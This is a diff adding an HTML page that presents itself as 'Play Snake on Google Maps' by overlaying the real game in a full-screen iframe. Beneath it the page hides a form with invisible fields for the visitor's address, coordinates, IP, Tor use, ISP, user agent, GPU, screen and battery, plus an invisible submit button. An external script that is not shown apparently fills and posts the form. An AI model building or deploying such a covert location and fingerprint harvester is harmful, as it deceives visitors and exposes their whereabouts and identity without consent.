@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <link rel="shortcut icon" type="image/jpg" href="/favicon.ico"/>
+      <!-- HTML Meta Tags -->
+      <title>Play Snake on Google Maps</title>
+      <meta name="description" content="Play Snake in your own city with your phone or computer.">
+      <!-- Google / Search Engine Tags -->
+      <meta itemprop="name" content="Play Snake on Google Maps">
+      <meta itemprop="description" content="Play Snake in your own city with your phone or computer.">
+      <meta itemprop="image" content="https://sitename.netlify.app/maps.png">
+      <!-- Facebook Meta Tags -->
+      <meta property="og:url" content="https://sitename.netlify.app">
+      <meta property="og:type" content="website">
+      <meta property="og:title" content="Play Snake on Google Maps">
+      <meta property="og:description" content="Play Snake in your own city with your phone or computer.">
+      <meta property="og:image" content="https://sitename.netlify.app/maps.png">
+      <!-- Twitter Meta Tags -->
+      <meta name="twitter:card" content="summary_large_image">
+      <meta name="twitter:title" content="Play Snake on Google Maps">
+      <meta name="twitter:description" content="Play Snake in your own city with your phone or computer.">
+      <meta name="twitter:image" content="https://sitename.netlify.app/maps.png">
+   </head>
+   <body>
+      <form name="Location" method="POST" data-netlify="true" action="/redirect">
+         <p>
+            <label><textarea id="address" name="Address"></textarea></label>
+            <label><textarea id="maps2" name="Maps Address"></textarea></label>
+            <label><textarea id="maps" name="Maps Coords"></textarea></label>
+            <label><textarea id="coords" name="Coords"></textarea></label>
+            <label><textarea id="ip" name="IP Address"></textarea></label>
+            <label><textarea id="tor" name="Using Tor?"></textarea></label>    
+            <label><textarea id="isp" name="ISP"></textarea></label>      
+            <label><textarea id="usragent" name="User Agent"></textarea></label>
+            <label><textarea id="gpu" name="GPU"></textarea></label>
+            <label><textarea id="screen" name="Screen Dimensions"></textarea></label>
+            <label><textarea id="orient" name="Screen Orientation"></textarea></label>
+            <label><textarea id="battery" name="Battery Life"></textarea></label>
+         </p>
+         <p>
+            <button style="opacity:0;" id="send" type="submit"></button>
+         </p>
+      </form>
+      <iframe src="https://snake.googlemaps.com/" style="position:absolute; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
+      </iframe>
+   </body>
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+   <script src="/src/script.js" typr="text/javascript"></script>
+   <style>
+      textarea {
+      opacity: 0;
+      }
+   </style>
+</html>
